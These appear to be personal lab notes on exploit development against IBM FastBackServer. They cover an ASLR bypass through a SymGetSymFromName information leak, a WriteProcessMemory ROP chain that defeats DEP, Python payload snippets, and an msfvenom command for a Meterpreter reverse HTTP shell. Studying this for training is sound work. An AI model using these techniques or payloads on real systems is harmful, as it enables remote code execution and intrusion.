[[#ASLR Introduction]]
[[#Finding Information Leaks]]
	[[#FXCLI_DebugDispatch]]
	[[#Arbitrary Symbol Resolution]]
[[#Expanding the Exploit (ASLR Bypass)]]
[[#WriteProcessMemory DEP Bypass]]
	[[#WriteProcessMemory]]
	[[#Getting a Shell]]
 
---
# ASLR Introduction

Address Space Layout Randomization : Randomizes an exe or dll's loaded address each time the application starts.

Compilers on Windows take a *preferred base* address parameter which sets a base memory addresses of an executable when loaded. 
- `/REBASE`: compiler flag that allow DLLs to rebase to a different base address within a process if there is a conflict with another DLL.
- `/DYNAMICBASE`: is "ASLR". Forces rebase behavior as a standard, all executables will have a randomized base address. Visual Studio now enables this by default but a lot of older IDE's don't.

Native DLLs for the basic SYSTEM processes are loaded, randomized, and deconflicted at **system boot** but do not change until reboot.
Any further DLLs needed by an exe are loaded, randomized, and deconflicted, but a previously loaded SYSTEM DLLs retain their initial base addresses.

Limited Randomization:
32-bit ASLR with standard entropy only randomizes 8 bits of an address
STATIC      | RANDOM | STATIC 
00000000 | 11111111 | 00000000 00000000
Entropy: the amount of bits randomized when a base address is chosen. Generally the high 8 bits and low 16 bits remain static.
64-bit ASLR randomizes up to 19 bits

### ASLR Bypass Theory
There are 4 primary ways to bypass ASLR protections.

1. Modules Compiled without ASLR:
	- Check for the `/DYNAMICBASE` flag in other modules, shown as `*ASLR` in WinDbg narly
1. Exploit Low Entropy:
	- Lower 16 bits of a module are not randomized, so a partial override into the lower bits of an ASLR module will still redirect reliably 
	- Limited to a gadget size of 1, DEP cannot be enabled
1. Brute Force:
	- Realistic in 32-bit where only 8-bits of entropy are provided, app must not crash on invalid ROPs (or must auto-restart after crash)
1. Information Leaks:
	- Leverages a feature (or another exploit) which gives information about a modules address space.
	- This is the most modern and practical methodology

### Windows Defender Exploit Guard
WDEG: Add program to customize. Enable DEP and ALSR ("Force randomization for images")
See [[Stack Overflows and DEP Bypass#Windows Defender Exploit Guard (WDEG)]] for enabling ASLR in addition to DEP

Restart FastbackServer and reattach WinDbg, each time running `lm m csftpav6` to see the base address changing on each run.


---
# Finding Information Leaks
Usually this process requires thorough reverse engineering of a programs code paths. But we can lean on known functions from Win32 APIs with info leaks if they are imported by the program.

A prime example is the `dbghelp.dll` API which resolve function addresses from symbol names.
- Other examples: `CreateToolhelp32Snapshot`, `EnumProcessModules`, and C runtime APIs like `fopen`

### FXCLI_DebugDispatch
Start an IDA session on FastBackServer.exe and open the Imports tab to investigate Win32 APIs.
One specifically interesting API found in the Imports tab is `SymGetSymFromName`, which is loaded from `dbghelp` and may cause an info leak, but we don't know how it's accessed yet.

Reverse engineer `SymGetSymFromName` call stack:
1. Double click the API to go to the entry inside the .idata section
2. Cross-reference the API name (click name and press x) 
	- Both references come from `FXCLI_DebugDispatch`
3. Click into and navigate `DebugDispatch` graph to the function declaration (top left) and cross reference again on the function name.
	- This reference comes from `..._OraBR_Exec_Command` which we have worked in before and know manages network input logic
4. Click into the reference to see where the function is called from within `Exec_Command`
5. Move up blocks to inspect the preceding branch conditions
6. `var_61B30` (which ideally I would have renamed earlier) is compared many times, most recently against `2000h`, suggesting this is the opcode to access this branch

Craft Input to reach `SymGetSymFromName` call:
1. Update the python script with the new opcode `0x2000`
2. Change the psCommandBuffer to send A's, B's, and C's for each of the 3 buffers (lengths specified in psAgentCommand as before)
3. Static Dynamic Analysis with a `bp` at the opcode comparison instruction
	- WDEG cant randomize the base address of FastBackServer so static values will work for breakpoints
4. Run the program, stopping at the opcode check and confirming it works
5. `pa` (step to address) on the call to `DebugDispatch` confirming it reached there
6. `dd esp L3` to dump the arguments to this function
	- Some values are pointers, dumping the 2nd shows a list of A's meaning it points to the inputted network buffer

### Arbitrary Symbol Resolution

Stepping into DebugDispatch, I see lots of branches, signifying conditional checks on some input. There's also a repeating pattern in the leading blocks.
A call to `_ml_strbytelen` (wraps `strlen`) and `_ml_strnicmp` (`strcmp`)

`DebugDispatch`:
1. the first block checks length and compares against "help", test this in the debugger
	1. `bp` on strnicmp
	2. `dd esp L3` the args
	3. 2nd arg is "help"
	4. 3rd arg (max size) is 4
	5. 1st arg is pointer to buff of A's
2. Since the first 4 chars of the B's buffer (psCommanderBuffer, buffer 1) don't match "help", the function returns a non-zero value and a branch is taken in the wrong direction.
3. In the correct direction, the next comparison looks similar to the first but with "DumpMemoryPools"
4. This continues until the desired block which checks against "SymbolOperation"
5. update POC with psCommandBuffer buffer 1 beginning with "SymbolOperation" to match this check
	- script edits
```
	# psCommandBuffer                      
	sym_op = b'SymbolOperation'
	buf += sym_op + bytearray([0x42]*(0x100 - len(sym_op))) # buffer 1
	buf += bytearray([0x43]*0x100) # buffer 2
	buf += bytearray([0x44]*0x100) # buffer 3
```
6. `bp` on SymbolOperation `_ml_strnicmp`, rerun script
7. Check pushed arguments and ensure function returns with eax value of 0
8. Execution continues to block containing `SymGetSymFromName`

Barring any error from other calls in this block, `SymGetSymFromName` should be called. 
To understand how to use the function, I look up the prototype for the function.

PROTOYPE for `SymGetSymFromName`
```
BOOL IMAGEAPI SymGetSymFromName(
	HANDLE  hProcess,
	PCSTR Name,              # pointer to symbol name to be resolved as a null terminated string
	IMAGEHLP_SYMBOL Symbol   # sub-struct
);
```
 - value of Name in the current POC is the string A's
 - Symbol is a pointer to a struct that is allocated before the call, but populated by SymGetSym
 
Structure for `IMAGEHLP_SYMBOL`
```
typedef struct _IMAGEHLP_SYMBOL {
  DWORD SizeOfStruct;
  DWORD Address;
  DWORD Size;
  DWORD Flags;
  DWORD MaxNameLength;
  CHAR  Name[1];
} IMAGEHLP_SYMBOL, *PIMAGEHLP_SYMBOL;
```
 - We specifically want to get the Address field of this populated struct
	 - This gives the base address of the specified symbol Name

`SymGetSymFromName`:
 1. Update script to look for address of WriteProcessMemory 
	 1. `sym_op = b'SymbolOperationWriteProcessMemory' + b'\x00'`
	 2. Null byte is desired in this case, will end the rest of the input parsing
 2. `bp` at SymGetSym call, run script
 3. `da poi(esp+4)` shows WriteProcessMemory, our input
 4. `dd esp+8 L1` -> `dds PREV+4 L1` shows 0000's where the returned address will go
 5. `p` to step over the API call
 6. `dds PREV+4 L1` -> `u ADDR` shows address of WriteProcessMemory
 7. Now I just need a way to retrieve this info over the network

### Symbol Address Retrieval
It makes sense that this functionality is intended to return some info back to the user. I continue reversing to find a code path that returns the SymGetSym info.

`DebugDispatch`:
After returning from `SymGetSym`, there is a branch based on its return value leading to a block in which strings are printed (saved to a buffer) based on the info returned about the function
1. Args are pushed and first `sprintf` call is made to print "Address is: ..."
	1. the output from the sprintf call is stored at `arg_0` offset from ebp
2. The above happens again for 2 more strings "Flags are:" and "Size is:"
3. Use dynamic analysis to determine the value of `arg_0` (0x8 in this case)
4. Progress to the end of the block and inspect the data stored at ebp+0x8
	1. It should be a string with all the above printed statements
5. The next branch is taken since eax wasn't returned as 0 from the `strcmp`
6. The following basic blocks do a bunch of `strcmp`'s to what seems like file extensions
7. Follow this function out to its return to `Exec_Command`

`Exec_Command`:
1. there is cmp check for eax (return value of DebugDispatch) in which the jump is not taken (eax = 1), likely because it returned without error
2. The next conditional block is a mass converge of many conditional
3.  The checks in the following blocks aren't on controllable variables, follow the cmps with static-dynamic analysis until something signifies an attempt to return info
4. Stop at `GetConnectedIpPort`
5. There are 2 `lea` instructions on stack values just before the call, then pushed as args
	1.  `lea` is typically used in this context when the address being loaded is used as a return value location for the upcoming function call
6. Stop exec at the call to `GetConnectedIpPort`
7. dump memory of the two addresses before the call `dd ebp-12550 L1` and `dd ebp-61bc L1`
	1. There's nothing, just 0's
8. step over with`p` then dump memory after the call, seeing they are now populated
	- Guessing from the call function name `GetConnectedIpPort`, assume some association to a socket connection standards which uses uses winsock's `connect`

PROTOTYPE for WSAAPI connect:
```
int WSAAPI connect(
  [in] SOCKET         s,
  [in] const sockaddr *name,
  [in] int            namelen
);
```

PROTOTYPE for sockaddr_in:
```
struct sockaddr_in {
        short   sin_family;
        u_short sin_port;
        struct  in_addr sin_addr;
        char    sin_zero[8];
};
```
- sockaddr_in's ip address is the `in_addr` struct, which stores each octet as a byte in a word
- port is a u_short (unsigned word)

`Exec_Command`:
1. I expect the `GetConnectedIpPort` return values to be an address and port in the above format
2. First value (anecdotally): `00006882`
	1. Likely a port number
	2. `? 8268` = 33384, value is stored as a big endian short
3. Second value: `dc2da8c0`
	1. IP address
	2. `? each_byte` = 192.168.45.220
4. Open cmd as admin, run `netstat -anbp tcp` to see current tcp connections, and confirm this is the current session connection
5. Follow code flow until the call to `IF_Buffer_Send`
7. Dump arguments and see that the pushed `pcFileBuffer` is a pointer to the previously crafted string containing the address of WriteProcessMemory
8. Before inspecting the call, attempt to catch a response with the script using the current buffer input
	1. `response = s.recv(1024) // print(response)
10. Make updates to the script to parse out the raw address (for future usability), and create a catch case for null response
	1. `response_address = parse_response(response) // print(str(hex(response_address)))`
	
```
def parse_response(response):
    pattern = b"Address is: "
    offset = response.find(pattern)
    if offset != -1:      
        addr_start = offset + len(pattern) + 2
        response = response[addr_start:addr_start+8]      
        return response
    return "Invalid input received"
```

--- 
# Expanding the Exploit (ASLR Bypass)

Previously we were able to retrieve an address to `WriteProcessMemory` which also gave a pointer to `kernel32.dll`. However, every monthly Windows update will change the offsets of symbols within this module, breaking any ROP gadgets used by the exploit. To make this exploit more resilient, we can leak the baked in IBM modules instead and build ROP gadgets from those, meaning that the exploit will only be dependent on the version of FastBackServer (vs the version of Windows)

### Leaking an IBM Module
List loaded IBM modules and their locations. From there select a suitable module to pass to the information leak vulnerability to determine its runtime address and start building the ROP chain.

- D: `lm f`, shows 10 IBM modules + the FastBackServer exe
- Can't use any that start with 0x00
- Arbitrarily chose `libeay32IBM2019.dll`
- Find filepath and transfer .dll file to Kali box for IDA analysis
- S: Go to export table, take arbitrary function and find its offset from the base address of the module
	- In this case `N98E_CRYPTO_get_net_lockid`
 - Run the script looking for this symbol: `symbol = b"SYMBOL" + b"\x00 // buf += symbol + ... // #way later // libeay32IBM019_base = response_address - 0x14E0`
- Run script and ensure it gets the base address
### Avoiding Bad Characters
The previous list of bad characters found in the DEP exploit still apply here, and there is a bad one in the return base address. Use ProcMon to verify that the FastBack WatchDog is restarting the FastBackServer after a crash. Then, rerun the script to get the new base address after being randomized by ASLR and check if it still contains a bad character.

ProcMon : Process Monitor

- Bad chars: 0x00, 0x09, 0x0a, 0x0c, 0x0d, 0x20
- We are leveraging the same scanf vulnerability so the bad chars still apply
- If the returned base address has a bad char we cant use it
- FastBack WatchDog should restart FastBack on crash
- Run ProcMon.exe as admin, which can monitor process creation
	- Filter > Filter
	- Filter Rule: Operation | contains | Process // for Process Start and Process Exit
	- Add > Apply
- Create a crash by attaching WinDbg then closing WinDbg
- Watch the process restart then rerun the script to get a new base address
- If no bad char then its good to go, otherwise repeat process
  

--- 
# WriteProcessMemory DEP Bypass

In the previous DEP bypass VirtualAlloc was used to modify the protections of the stack where the shellcode lives. Here a new technique is used via WriteProcessMemory to copy our shellcode from the stack into an allocated module's code page. Specifically, copy the shellcode into `libeay32IBM019` which is already executable. Typically a code page is not writeable, but WriteProcessMemory will take care of this.

https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
### WriteProcessMemory
```
BOOL WriteProcessMemory(
	HANDLE hProcess,
	LPVOID lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T nSize,
	SIZE_T *lpNumberOfBytesWritten
)
```
- hProcess is a handle to the desired process, in this case -1 will get the current process. The intent is to perform a copy operations in the current process
- lpBaseAddress is the absolute memory address in the code section where the new code will be written. The exploit should avoid overwriting existing code.
	- Compiled code is page-aligned. When the opcodes don't use up the whole page the rest of the page will be nulled (0x00's). This can be used to find where the "code cave" (space for the new injected code) begins

- D: Attach to FastBack, pause exec
- Offset to PE header is located at offset 0x3C from the MZ header
	- [[Portable Executable (PE)]]
	- dd libeay32IBM019 + 3c L1
	- PE Header Offset: 00000108
- Offset to code section is 0x2C from PE Header
	- dd libeay32IBM019 +0x108 + 2c
	- Code Segment Offset: 00001000 (from base addr)
- ? libeay32IBM019 + 1000 = 031c1000
- !address 032c1000
- see End Address: 03250300
- subtract an arbitrary large space (400) from End Address to determine if theres space to write a shellcode in the code cave
- see a bunch of 00's? Then this is unused space we can use
- Protections are still PAGE_EXECUTE_READ
- Find the offset into the module where the code cave starts
	- 03253000 - 400 - libeay32IBM019 = 00092c00
	- this has a null byte, but we can just use 092c04 instead
- So lpBaseAddress will be libeay32IBM019 + 092c04

- lpBuffer is the source of the write, so it must take the stack address of the overflowed shellcode
- nSize is the size of the shellcode
- `*lpNumberOfBytesWritten` is a location where the function will report the number of bytes written 
	- Use an address in the data section of `libeay32IBM019` since it wont have to be gathered at runtime
- !dh -a libeay32IBM019, to dump data section and header info
	- Look for: SECTION HEADER #4 // .data name // F018 virtual size // D5000 virtual address
	- size is 0xf018 and offset is 0x5000
- Again, this is page aligned and any unused space is nulled, so find the "data cave" using the previous info
- ? libeay32IBM019 + d5000 + f018 + 4 = 032a401c
- dd 032a401c, shows a bunch of null bytes
- !vprot ADDR, shows the section is set as PAGE_READWRITE
- ? ADDR - libeay32IBM019, shows offset of data writeable section from base address

Make the API call with ROP
- Set up the python script to the point where it triggers the scanf buffer overflow
- ROP Skeleton for WriteProcessMemory goes in psCommandBuffer (PUT CODE HERE)
	- WriteProcessMemory address, known by ASLR (will be pointed to by the eip overwrite)
	- shellcode address (rop chain returns here after WPM)
	- (start args for WPM) Handle is -1 
	- lpBaseAddress (destination) is module + code cave offset
	- lpBuffer (from) address is not known yet, will be shellcode address on stack
	- lpNumberOfBytesWritten is the base + offset to empty data section

ROP chain creation
- Since ASLR is on, given ROP address from rp++ are not accurate. rp++ calculates from the PE header preferred base address, so we need to subtract the base to get the offset. In exploit use `dllBase + OFFSET` instead of the raw value given by rp++
	- D:  `dd libeay32IBM019 + 3c L1`
		- PE header offset value stored at 0x3c from module start
	- D:  `dd libeay32IBM019 + 108 + 34 L1`
		-  ImageBase (Preferred base address) is at offset 0x34 in PE header
	- Outputs value 0x10000000
ROP chain to set lpBuffer 
Align a register (eax) to the dummy shellcode location on the stack
	- `push esp ; pop esi ; ret  # store a copy of esp
	- `mov eax, esi ; pop esi ; ret  # move value to eax for manipulation`
		- pack junk
	- `pop ecx ; ret  # pop in large value avoiding bad chars`
		- pack 0x77777878
	- `add eax, ecx ; ret  # add large val to eax`
	- `pop ecx ; ret  # pop in another large val to trigger bit overflow`
		- pack 0x88888888
	- `add eax, ecx ; ret  # add large val to eax`
	- 0x77777878 + 0x88888888 = 0x...1'00000100 (where the 33rd bit is overflowed)
	- `mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010  # move eax val to ecx`
		- oof lots of side effects
		- pack junk for pop into esi
	- `pop eax ; ret  # pop val (-0x120) into eax`
		- pack junk x4 for previous retn 0x0010 (used in stdcall convention where callee cleans out stack args, in this case 4 args)
		- pack 0xfffffee0 for pop
	- `add eax, ecx ; ret`
	- `mov [eax], ecx ; ret  # place shellcode adderss in lpBuffer argument location`

ROP chain to set nSize (size of shellcode)
	- `inc eax ; ret  # move pointer by 1 byte toward next arg on stack`
		- x4 to move a word
	- `push eax ; pop esi ; ret  # save the argument addr in eax to new reg esi`
	- `pop eax ; ret  # pop -524 into eax (shellcode size approx)`
		- pack 0xfffffdf4
	- `neg eax ; ret  # negate`
	- `mov ecx, eax ; mov eax, esi ; pop esi ; ret 0x0010  # move 524 to ecx, move back argument addr to eax`
		- side effectsssssss
		- pack junk for pop into esi
	- `mov [eax], ecx ; ret  # move 524 into nSize argument`
		- pack junk x4 for retn 0x0010

test rop chain pushes args
- `bp libeay32IBM019+0x1fd8`, breakpoint on gadget that sets stack values
- Once triggered twice, values should be set
- `dd eax-14 L7`, to view WPM arguments
	- see 0000020c as size param (decimal 524)

Set up return into WriteProcessMemory skeleton
current val of eax is nSize arg (+0x14 from WPM return address on stack)
- `pop ecx ; ret  # pop in -0x14 to ecx`
	- pack 0xffffffec
- `add eax, ecx ; ret  # add -0x14 to eax (moving it from nSize arg to WPM address)`
- `xchg eax, esp ; ret  # swap eax into esp to return into (with args setup)`

test alignment to return from WPM
- `bp libeay32IBM019+0x5b415`, breakpoint on xchg gadget
- step over xchg and ret instructions
- WriteProcessMemory call should be next
- `dds esp L6`, to view args pushed to WPM
- `u LPBASEADDRESS`, to view pre execution code cave
- `pt`, `u LPBASEADDRESS`, to view copied over dummy shellcode
- `p`, to confirm return from WPM drops us into the shellcode

### Getting a Shell

Replace dummy data with Meterpreter generated shellcode
- Get offset from end of ROP chain to lpBuffer stack address where the shellcode starts. Prepend shellcode by this offset. 
	- lpBuffer previously found at 0x110ee41c (??)
	- `dd 110ee41c - 100`, we see the last shellcode instruction at 110ee3ac
	- `? 110ee41c - 110ee3b0`, to get shellcode padding length of 0x6c
- update POC: `shellcode_padding = ... // shellcode = ... // padding = ... - len(shellcode_padding) - len(shellcode))`
- Test in WinDbg to ensure placeholder shellcode starts at the exact lpBuffer location
	- `bp KERNEL32!WriteProcessMemoryStub`
	- `dds esp L6`
	- `dd lPBUFFER - 10 L8`, to inspect memory before and after the intended shellcode start
- Generate shellcode with msfvenom `msfvenom -p windows/meterpreter/reverse_http LHOST=... LPORT=8005 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode`
- Test again
	- `bp KERNEL32!WPMStub`
	- `pt` to skip to end of WriteProcessMemory
	- `u poi(esp)`, shows shellcode instructions
- Oh no! Access violation! the `xor` instruction tries to modify data in the shellcode itself, which has been copied to a region without write permissions
- The msfvenom decoded payloads will not work
- Alternatives would be: write shellcode with no bad chars includes, OR replace bad characters in the shellcode and replace them at runtime with more ROP

### Custom ROP Decoder
Replace the bad characters with allowed dummy characters. Then create a rop gadget to replace the first dummy character with the original, bad character at runtime.

### Automating the Shellcode Encoding
Modify the python script to find bad characters in the shellcode, store their offset, create a mapping of dummy characters, and replace the bad characters.

### Automating the ROP Decoder
Modify the python script to utilize the previous shellcode character mapping and offsets to dynamically create ROP gadgets that will revert the dummy characters at runtime, resulting in functioning shellcode.



 




